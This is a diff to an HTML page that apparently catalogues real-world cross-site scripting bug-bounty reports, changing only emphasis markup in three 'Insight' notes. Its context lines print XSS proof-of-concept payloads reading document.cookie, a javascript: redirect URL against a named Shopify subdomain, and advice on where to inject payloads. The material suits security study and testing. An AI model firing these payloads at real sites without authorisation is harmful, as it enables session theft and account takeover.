@@ -385,7 +385,7 @@ document.write("&lt;iframe src='http://localhost:9222/json' width=900 height=100
 <div class="pre">&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 "&gt;&lt;img src=x onerror=prompt(document.cookie)&gt;
 &lt;svg/onload=confirm(document.cookie)&gt;</div>
-<p class="insight"><b>Insight —</b> Any persisted text field is a stored-XSS candidate; the sink is usually a *different* view (dashboard load, profile page, shared object, downstream export) than the input form. Enter payloads everywhere and then walk every page that renders that data. Fields that get shared to other/higher-priv users turn low-priv input into ATO.</p>
+<p class="insight"><b>Insight —</b> Any persisted text field is a stored-XSS candidate; the sink is usually a <em>different</em> view (dashboard load, profile page, shared object, downstream export) than the input form. Enter payloads everywhere and then walk every page that renders that data. Fields that get shared to other/higher-priv users turn low-priv input into ATO.</p>
 <div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1532858" target="_blank" rel="noopener">hackerone.com/reports/1532858</a></span><a class="src" href="#report-1532858" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cross-site-scripting/stored" target="_blank" rel="noopener">⚑ Lab: stored</a></div></article>
 <article class="spec" id="report-1110243" style="--sv:var(--sev-crit)" data-sev="4" data-votes="12" data-bounty="0">
 <div class="spec-eyebrow">Real-world example</div>
@@ -1837,7 +1837,7 @@ https://TARGET/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3
 
 &lt;!-- oembed.json --&gt;
 {"type":"image","image":"xss","description":"descr' onerror='alert(/XSS/)","image_width":1,"image_height":1}</div>
-<p class="insight"><b>Insight —</b> Server-side URL unfurlers/link-previews are a rich stored-XSS sink: the attacker controls the *remote* metadata the app trusts. Escape-then-decode round-trips are a classic reintroduction bug. Watch for og:*, oembed, and JSON+oembed discovery links.</p>
+<p class="insight"><b>Insight —</b> Server-side URL unfurlers/link-previews are a rich stored-XSS sink: the attacker controls the <em>remote</em> metadata the app trusts. Escape-then-decode round-trips are a classic reintroduction bug. Watch for og:*, oembed, and JSON+oembed discovery links.</p>
 <div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/197902" target="_blank" rel="noopener">hackerone.com/reports/197902</a></span><a class="src" href="#report-197902" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cross-site-scripting/stored" target="_blank" rel="noopener">⚑ Lab: stored</a></div></article>
 <article class="spec hidden" id="report-846905" style="--sv:var(--sev-high)" data-sev="3" data-votes="12" data-bounty="2000">
 <div class="spec-eyebrow">Real-world example</div>
@@ -3011,7 +3011,7 @@ Content-Type: application/json;charset=UTF-8
 <h4>Root cause</h4><p style="margin:0">api.collabs.shopify.com login endpoint uses creator_redirect as a navigation target without scheme validation, so javascript: executes.</p>
 <h4>Method</h4><ol><li>Authenticate on collabs</li><li>Open /creator/auth/login?creator_redirect=javascript:alert(document.domain)</li><li>Script runs on the api subdomain</li></ol>
 <div class="pre">https://api.collabs.shopify.com/creator/auth/login?creator_redirect=javascript:alert(document.domain)</div>
-<p class="insight"><b>Insight —</b> Redirect/return-url params that feed location assignment are open-redirect AND XSS sinks if they accept the javascript: scheme; always test javascript:, data:, and //evil in *redirect*/next/return params.</p>
+<p class="insight"><b>Insight —</b> Redirect/return-url params that feed location assignment are open-redirect AND XSS sinks if they accept the javascript: scheme; always test javascript:, data:, and //evil in <em>redirect</em>/next/return params.</p>
 <div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1672459" target="_blank" rel="noopener">hackerone.com/reports/1672459</a></span><a class="src" href="#report-1672459" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank" rel="noopener">⚑ Lab: reflected</a></div></article>
 <article class="spec hidden" id="report-456333" style="--sv:var(--sev-med)" data-sev="2" data-votes="51" data-bounty="1">
 <div class="spec-eyebrow">Real-world example</div>
